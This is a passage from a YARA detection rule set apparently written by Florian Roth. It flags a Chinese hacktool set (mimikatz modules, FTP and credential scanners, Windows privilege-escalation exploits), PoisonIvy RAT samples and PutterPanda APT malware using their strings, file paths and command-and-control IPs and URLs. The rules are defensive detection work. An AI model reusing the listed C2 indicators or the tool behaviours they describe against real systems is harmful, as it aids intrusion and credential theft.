filesize < 300KB and all of them\n}\n\nrule kappfree_2_RID2AF0 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file kappfree.dll\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 09:31:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"kappfree.dll\" fullword ascii\n      $s2 = \"kappfree de mimikatz pour Windows (anti AppLocker)\" fullword wide\n      $s3 = \"' introuvable !\" fullword wide\n      $s4 = \"kiwi\\\\mimikatz\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 2 of them\n}\n\nrule x_way2_5_sqlcmd_RID2CE2 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file sqlcmd.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 10:08:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"LOADER ERROR\" fullword ascii\n      $s2 = \"The procedure entry point %s could not be located in the dynamic link library %s\" fullword ascii\n      $s3 = \"The ordinal %u could not be located in the dynamic link library %s\" fullword ascii\n      $s4 = \"kernel32.dll\" fullword ascii\n      $s5 = \"VirtualAlloc\" fullword ascii\n      $s6 = \"VirtualFree\" fullword ascii\n      $s7 = \"VirtualProtect\" fullword ascii\n      $s8 = \"ExitProcess\" fullword ascii\n      $s9 = \"user32.dll\" fullword ascii\n      $s10 = \"MessageBoxA\" fullword ascii\n      $s12 = \"wsprintfA\" fullword ascii\n      $s13 = \"kernel32.dll\" fullword ascii\n      $s14 = \"GetProcAddress\" fullword ascii\n      $s15 = \"GetModuleHandleA\" fullword ascii\n      $s16 = \"LoadLibraryA\" fullword ascii\n      $s17 = \"odbc32.dll\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 23KB and filesize > 20KB and all of them\n}\n\nrule Win32_klock_RID2B17 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file klock.dll\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 08:51:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"klock.dll\" fullword ascii\n      $s2 = \"Erreur : impossible de basculer le bureau ; SwitchDesktop : \" fullword wide\n      $s3 = \"klock de mimikatz pour Windows\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 250KB and all of them\n}\n\nrule ms10048_x64_RID2A2F : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file ms10048-x64.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 04:10:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"The target is most likely patched.\" fullword ascii\n      $s2 = \"Dojibiron by Ronald Huizer, (c) master#h4cker.us  \" fullword ascii\n      $s3 = \"[ ] Creating evil window\" fullword ascii\n      $s4 = \"[+] Set to %d exploit half succeeded\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 40KB and 1 of them\n}\n\nrule hscangui_RID2A63 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file hscangui_RID2A63.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 05:36:41\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"[%s]: Found \\\"FTP account: anyone/anyone@any.net\\\"  !!!\" fullword ascii\n      $s2 = \"http://www.cnhonker.com\" fullword ascii\n      $s3 = \"%s@ftpscan#Cracked account:  %s/%s\" fullword ascii\n      $s4 = \"[%s]: Found \\\"FTP account: %s/%s\\\" !!!\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 220KB and 2 of them\n}\n\nrule GoodToolset_ms11080_RID2DBD : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file ms11080.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 10:44:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2022-12-21\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"[*] command add user 90sec 90sec\" fullword ascii\n      $s2 = \"\\\\ms11080\\\\Debug\\\\ms11080.pdb\" ascii\n      $s3 = \"[>] by:Mer4en7y@90sec.org\" fullword ascii\n      $s4 = \"[*] Add to Administrators success\" fullword ascii\n      $s5 = \"[*] User has been successfully added\" fullword ascii\n      $s6 = \"[>] ms11-08 Exploit\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 240KB and 2 of them\n}\n\nrule epathobj_exp64_RID2C74 : CHINA DEMO EXE FILE HKTL T1068 {\n   meta:\n      description = \"Chinese Hacktool Set - file epathobj_exp64_RID2C74.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 09:49:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2022-12-21\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL, T1068\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Watchdog thread %d waiting on Mutex\" fullword ascii\n      $s2 = \"Exploit ok run command\" fullword ascii\n      $s3 = \"\\\\epathobj_exp\\\\x64\\\\Release\\\\epathobj_exp.pdb\" ascii\n      $s4 = \"Alllocated userspace PATHRECORD () %p\" fullword ascii\n      $s5 = \"Mutex object did not timeout, list not patched\" fullword ascii\n      $s6 = \"- inconsistent onexit begin-end variables\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 150KB and 2 of them\n}\n\nrule kelloworld_2_RID2BE1 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file kelloworld.dll\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 09:25:21\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Hello World!\" fullword wide\n      $s2 = \"kelloworld.dll\" fullword ascii\n      $s3 = \"kelloworld de mimikatz pour Windows\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule HScan_v1_20_hscan_RID2D11 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file hscan.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 10:16:01\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"[%s]: Found \\\"FTP account: anyone/anyone@any.net\\\"  !!!\" fullword ascii\n      $s2 = \"%s -h 192.168.0.1 192.168.0.254 -port -ftp -max 200,100\" fullword ascii\n      $s3 = \".\\\\report\\\\%s-%s.html\" fullword ascii\n      $s4 = \".\\\\log\\\\Hscan.log\" fullword ascii\n      $s5 = \"[%s]: Found cisco Enable password: %s !!!\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 2 of them\n}\n\nrule _Project1_Generate_rejoice_RID3142 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - from files Project1.exe, Generate.exe, rejoice.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 13:14:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"2cb4c3916271868c30c7b4598da697f59e9c7a12\"\n      hash2 = \"fe634a9f5d48d5c64c8f8bfd59ac7d8965d8f372\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"sfUserAppDataRoaming\" fullword ascii\n      $s2 = \"$TRzFrameControllerPropertyConnection\" fullword ascii\n      $s3 = \"delphi32.exe\" fullword ascii\n      $s4 = \"hkeyCurrentUser\" fullword ascii\n      $s5 = \"%s is not a valid IP address.\" fullword wide\n      $s6 = \"Citadel hooking error\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of them\n}\n\nrule _hscan_hscan_hscangui_RID2F9A : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - from files hscan.exe, hscan.exe, hscangui.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 12:04:11\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"568b06696ea0270ee1a744a5ac16418c8dacde1c\"\n      hash2 = \"af8aced0a78e1181f4c307c78402481a589f8d07\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \".\\\\log\\\\Hscan.log\" fullword ascii\n      $s2 = \".\\\\report\\\\%s-%s.html\" fullword ascii\n      $s3 = \"[%s]: checking \\\"FTP account: ftp/ftp@ftp.net\\\" ...\" fullword ascii\n      $s4 = \"[%s]: IPC NULL session connection success !!!\" fullword ascii\n      $s5 = \"Scan %d targets,use %4.1f minutes\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 240KB and all of them\n}\n\nrule Kiwi_Tools_Mimikatz_1_RID2F4A : CHINA DEMO EXE FILE HKTL S0002 T1003 T1134_005 T1550_002 T1550_003 {\n   meta:\n      description = \"Chinese Hacktool Set - from mimikatz files\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 11:50:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"55d5dabd96c44d16e41f70f0357cba1dda26c24f\"\n      hash2 = \"7ac7541e20af7755b7d8141c5c1b7432465cabd8\"\n      hash3 = \"9fbfe3eb49d67347ab57ae743f7542864bc06de6\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL, S0002, T1003, T1134_005, T1550_002, T1550_003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"http://blog.gentilkiwi.com/mimikatz\" ascii\n      $s2 = \"Benjamin Delpy\" fullword ascii\n      $s3 = \"GlobalSign\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and all of them\n}\n\nrule Kiwi_Tools_Mimikatz_2_RID2F4B : CHINA DEMO EXE FILE HKTL S0002 T1003 T1134_005 T1550_002 T1550_003 {\n   meta:\n      description = \"Chinese Hacktool Set - from mimikatz files\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 11:51:01\"\n      score = 85\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"55d5dabd96c44d16e41f70f0357cba1dda26c24f\"\n      hash2 = \"7ac7541e20af7755b7d8141c5c1b7432465cabd8\"\n      hash3 = \"9fbfe3eb49d67347ab57ae743f7542864bc06de6\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL, S0002, T1003, T1134_005, T1550_002, T1550_003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"mimikatz\" fullword wide\n      $s2 = \"Copyright (C) 2012 Gentil Kiwi\" fullword wide\n      $s3 = \"Gentil Kiwi\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and all of them\n}\n\nrule MAL_Fidelis_Advisory_Purchase_Order_pps_RID3661 : DEMO MAL {\n   meta:\n      description = \"Detects a string found in a malicious document named Purchase_Order.pps\"\n      author = \"Florian Roth\"\n      reference = \"http://www.fidelissecurity.com/sites/default/files/FTA_1017_Phishing_in_Plain_Sight-Body-FINAL.pdf\"\n      date = \"2015-06-09 16:53:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      tags = \"DEMO, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Users\\\\Gozie\\\\Desktop\\\\Purchase-Order.gif\" ascii\n   condition: \n      all of them\n}\n\nrule PoisonIvy_Sample_APT_3_RID2F58 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects a PoisonIvy Malware\"\n      author = \"Florian Roth\"\n      reference = \"VT Analysis\"\n      date = \"2015-06-03 11:53:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"\\\\notepad.exe\" ascii\n      $s1 = \"\\\\RasAuto.dll\" ascii\n      $s3 = \"winlogon.exe\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and all of them\n}\n\nrule PoisonIvy_Sample_APT_RID2EC6 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects a PoisonIvy APT malware group\"\n      author = \"Florian Roth\"\n      reference = \"VT Analysis\"\n      date = \"2015-06-03 11:28:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"pidll.dll\" fullword ascii\n      $s1 = \"sens32.dll\" fullword wide\n      $s3 = \"FileDescription\" fullword wide\n      $s4 = \"OriginalFilename\" fullword wide\n      $s5 = \"ZwSetInformationProcess\" fullword ascii\n      $s9 = \"Microsoft Media Device Service Provider\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 47KB and all of them\n}\n\nrule APT_Malware_PutterPanda_Rel_RID3167 : APT DEMO EXE FILE G0024 {\n   meta:\n      description = \"Detects an APT malware related to PutterPanda\"\n      author = \"Florian Roth\"\n      reference = \"VT Analysis\"\n      date = \"2015-06-03 13:21:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, EXE, FILE, G0024\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x0 = \"app.stream-media.net\" fullword ascii\n      $x1 = \"File %s does'nt exist or is forbidden to acess!\" fullword ascii\n      $s6 = \"GetProcessAddresss of pHttpQueryInfoA Failed!\" fullword ascii\n      $s7 = \"Connect %s error!\" fullword ascii\n      $s9 = \"Download file %s successfully!\" fullword ascii\n      $s10 = \"index.tmp\" fullword ascii\n      $s11 = \"Execute PE Successfully\" fullword ascii\n      $s13 = \"aa/22/success.xml\" fullword ascii\n      $s16 = \"aa/22/index.asp\" fullword ascii\n      $s18 = \"File %s a Non-Pe File\" fullword ascii\n      $s19 = \"SendRequset error!\" fullword ascii\n      $s20 = \"filelist[%d]=%s\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and 1 of ( $x* ) ) or ( 4 of ( $s* ) )\n}\n\nrule PoisonIvy_Sample_APT_2_RID2F57 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects a PoisonIvy Malware\"\n      author = \"Florian Roth\"\n      reference = \"VT Analysis\"\n      date = \"2015-06-03 11:53:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"pidll.dll\" fullword ascii\n      $s1 = \"sens32.dll\" fullword wide\n      $s2 = \"9.0.1.56\" fullword wide\n      $s3 = \"FileDescription\" fullword wide\n      $s4 = \"OriginalFilename\" fullword wide\n      $s5 = \"ZwSetInformationProcess\" fullword ascii\n      $s6 = \"\\\"%=%14=\" fullword ascii\n      $s7 = \"091A1G1R1_1g1u1z1\" fullword ascii\n      $s8 = \"gHsMZz\" fullword ascii\n      $s9 = \"Microsoft Media Device Service Provider\" fullword wide\n      $s10 = \"Copyright (C) Microsoft Corp.\" fullword wide\n      $s11 = \"MFC42.DLL\" fullword ascii\n      $s12 = \"MSVCRT.dll\" fullword ascii\n      $s13 = \"SpecialBuild\" fullword wide\n      $s14 = \"PrivateBuild\" fullword wide\n      $s15 = \"Comments\" fullword wide\n      $s16 = \"040904b0\" fullword wide\n      $s17 = \"LegalTrademarks\" fullword wide\n      $s18 = \"CreateThread\" fullword ascii\n      $s19 = \"ntdll.dll\" fullword ascii\n      $s20 = \"_adjust_fdiv\" ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 47KB and all of them\n}\n\nrule APT_Malware_PutterPanda_Rel_2_RID31F8 : APT DEMO EXE FILE G0024 {\n   meta:\n      description = \"APT Malware related to PutterPanda Group\"\n      author = \"Florian Roth\"\n      reference = \"VT Analysis\"\n      date = \"2015-06-03 13:45:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, EXE, FILE, G0024\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"http://update.konamidata.com/test/zl/sophos/td/result/rz.dat?\" fullword ascii\n      $s1 = \"http://update.konamidata.com/test/zl/sophos/td/index.dat?\" fullword ascii\n      $s2 = \"Mozilla/4.0 (Compatible; MSIE 6.0;)\" fullword ascii\n      $s3 = \"Internet connect error:%d\" fullword ascii\n      $s4 = \"Proxy-Authorization:Basic\" fullword ascii\n      $s5 = \"HttpQueryInfo failed:%d\" fullword ascii\n      $s6 = \"read file error:%d\" fullword ascii\n      $s7 = \"downdll.dll\" fullword ascii\n      $s8 = \"rz.dat\" fullword ascii\n      $s9 = \"Invalid url\" fullword ascii\n      $s10 = \"Create file failed\" fullword ascii\n      $s11 = \"myAgent\" fullword ascii\n      $s12 = \"%s%s%d%d\" fullword ascii\n      $s13 = \"down file success\" fullword ascii\n      $s15 = \"error!\" fullword ascii\n      $s18 = \"Avaliable data:%u bytes\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and 6 of them\n}\n\nrule PoisonIvy_Sample_APT_4_RID2F59 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects a PoisonIvy Sample APT\"\n      author = \"Florian Roth\"\n      reference = \"VT Analysis\"\n      date = \"2015-06-03 11:53:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Microsoft Software installation Service\" fullword wide\n      $s1 = \"idll.dll\" fullword ascii\n      $s2 = \"mgmts.dll\" fullword wide\n      $s3 = \"Microsoft(R) Windows(R)\" fullword wide\n      $s4 = \"ServiceMain\" fullword ascii\n      $s5 = \"Software installation Service\" fullword wide\n      $s6 = \"SetServiceStatus\" fullword ascii\n      $s7 = \"OriginalFilename\" fullword wide\n      $s8 = \"ZwSetInformationProcess\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 7 of them\n}\n\nrule PoisonIvy_Sample_5_RID2E16 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects PoisonIvy RAT sample set\"\n      author = \"Florian Roth\"\n      reference = \"VT Analysis\"\n      date = \"2015-06-03 10:59:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Microsoft Software installation Service\" fullword wide\n      $s2 = \"pidll.dll\" fullword ascii\n      $s3 = \"\\\\mspmsnsv.dll\" ascii\n      $s4 = \"\\\\sfc.exe\" ascii\n      $s13 = \"ServiceMain\" fullword ascii\n      $s15 = \"ZwSetInformationProcess\" fullword ascii\n      $s17 = \"LookupPrivilegeValueA\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them\n}\n\nrule PoisonIvy_Sample_6_RID2E17 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects PoisonIvy RAT sample set\"\n      author = \"Florian Roth\"\n      reference = \"VT Analysis\"\n      date = \"2015-06-03 10:59:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"8c2630ab9b56c00fd748a631098fa4339f46d42b\"\n      hash2 = \"36b4cbc834b2f93a8856ff0e03b7a6897fb59bd3\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"124.133.252.150\" fullword ascii\n      $x3 = \"http://124.133.254.171/up/up.asp?id=%08x&pcname=%s\" fullword ascii\n      $z1 = \"\\\\temp\\\\si.txt\" ascii\n      $z2 = \"Daemon Dynamic Link Library\" fullword wide\n      $z3 = \"Microsoft Windows CTF Loader\" fullword wide\n      $z4 = \"\\\\tappmgmts.dll\" ascii\n      $z5 = \"\\\\appmgmts.dll\" ascii\n      $s0 = \"%USERPROFILE%\\\\AppData\\\\Local\\\\Temp\\\\Low\\\\ctfmon.log\" fullword ascii\n      $s1 = \"%USERPROFILE%\\\\AppData\\\\Local\\\\Temp\\\\ctfmon.tmp\" fullword ascii\n      $s2 = \"\\\\temp\\\\ctfmon.tmp\" ascii\n      $s3 = \"SOFTWARE\\\\Classes\\\\http\\\\shell\\\\open\\\\commandV\" fullword ascii\n      $s4 = \"CONNECT %s:%i HTTP/1.0\" fullword ascii\n      $s5 = \"start read histry key\" fullword ascii\n      $s6 = \"Content-Disposition: form-data; name=\\\"%s\\\"; filename=\\\"%s\\\"\" fullword ascii\n      $s7 = \"[password]%s\" fullword ascii\n      $s8 = \"Daemon.dll\" fullword ascii\n      $s9 = \"[username]%s\" fullword ascii\n      $s10 = \"advpack\" fullword ascii\n      $s11 = \"%s%2.2X\" fullword ascii\n      $s12 = \"advAPI32\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and 1 of ( $x* ) ) or ( 8 of ( $s* ) ) or ( 1 of ( $z* ) and 3 of ( $s* ) )\n}\n\nrule APT_Malware_PutterPanda_PSAPI_RID31C1 : APT CHINA DEMO EXE FILE G0024 {\n   meta:\n      description = \"Detects a malware related to Putter Panda\"\n      author = \"Florian Roth\"\n      reference = \"VT Analysis\"\n      date = \"2015-06-03 13:36:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, CHINA, DEMO, EXE, FILE, G0024\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"LOADER ERROR\" fullword ascii\n      $s1 = \"The procedure entry point %s could not be located in the dynamic link library %s\" fullword ascii\n      $s2 = \"psapi.dll\" fullword ascii\n      $s3 = \"urlmon.dll\" fullword ascii\n      $s4 = \"WinHttpGetProxyForUrl\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them\n}\n\nrule PoisonIvy_Sample_7_RID2E18 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects PoisonIvy RAT sample set\"\n      author = \"Florian Roth\"\n      reference = \"VT Analysis\"\n      date = \"2015-06-03 10:59:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Microsoft Software installation Service\" fullword wide\n      $s2 = \"pidll.dll\" fullword ascii\n      $s10 = \"ServiceMain\" fullword ascii\n      $s11 = \"ZwSetInformationProcess\" fullword ascii\n      $s12 = \"Software installation Service\" fullword wide\n      $s13 = \"Microsoft(R) Windows(R) Operating System\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule APT_Malware_PutterPanda_Gen1_RID318F : APT DEMO EXE FILE G0024 {\n   meta:\n      description = \"Detects a malware \"\n      author = \"Florian Roth\"\n      reference = \"not set\"\n      date = \"2015-06-03 13:27:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"76459bcbe072f9c29bb9703bc72c7cd46a692796\"\n      hash2 = \"e105a7a3a011275002aec4b930c722e6a7ef52ad\"\n      tags = \"APT, DEMO, EXE, FILE, G0024\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"%s%duserid=%dthreadid=%dgroupid=%d\" fullword ascii\n      $s2 = \"ssdpsvc.dll\" fullword ascii\n      $s3 = \"Fail %s \" fullword ascii\n      $s4 = \"%s%dpara1=%dpara2=%dpara3=%d\" fullword ascii\n      $s5 = \"LsaServiceInit\" fullword ascii\n      $s6 = \"%-8d Fs %-12s Bs \" fullword ascii\n      $s7 = \"Microsoft DH SChannel Cryptographic Provider\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and 5 of them\n}\n\nrule Malware_MsUpdater_String_in_EXE_RID331B : APT DEMO EXE FILE G0024 {\n   meta:\n      description = \"MSUpdater String in Executable\"\n      author = \"Florian Roth\"\n      reference = \"VT Analysis\"\n      date = \"2015-06-03 14:33:41\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, EXE, FILE, G0024\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"msupdate.exe\" fullword wide\n      $x3 = \"msupdater.exe\" fullword ascii\n      $x4 = \"msupdater32.exe\" fullword ascii\n      $x5 = \"msupdater32.exe\" fullword wide\n      $x6 = \"msupdate.pif\" fullword ascii\n      $fp1 = \"_msupdate_\" wide\n      $fp2 = \"_msupdate_\" ascii\n      $fp3 = \"/kies\" wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and ( 1 of ( $x* ) ) and not ( 1 of ( $fp* ) )\n}\n\nrule APT_Malware_PutterPanda_MsUpdater_3_RID346B : APT DEMO EXE FILE G0024 {\n   meta:\n      description = \"Detects Malware related to PutterPanda - MSUpdater\"\n      author = \"Florian Roth\"\n      reference = \"VT Analysis\"\n      date = \"2015-06-03 15:29:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, EXE, FILE, G0024\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"msupdater.exe\" fullword ascii\n      $s1 = \"Explorer.exe \\\"\" fullword ascii\n      $s2 = \"FAVORITES.DAT\" fullword ascii\n      $s4 = \"COMSPEC\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and 3 of them\n}\n\nrule APT_Malware_PutterPanda_MsUpdater_1_RID3469 : APT DEMO EXE FILE G0024 {\n   meta:\n      description = \"Detects Malware related to PutterPanda - MSUpdater\"\n      author = \"Florian Roth\"\n      reference = \"VT Analysis\"\n      date = \"2015-06-03 15:29:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, EXE, FILE, G0024\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x0 = \"msupdate.exe\" fullword wide\n      $x1 = \"msupdate\" fullword wide\n      $s1 = \"Microsoft Corporation. All rights reserved.\" fullword wide\n      $s2 = \"Automatic Updates\" fullword wide\n      $s3 = \"VirtualProtectEx\" fullword ascii\n      $s4 = \"Invalid parameter\" fullword ascii\n      $s5 = \"VirtualAllocEx\" fullword ascii\n      $s6 = \"WriteProcessMemory\" fullword ascii\n   condition: \n      ( uint16 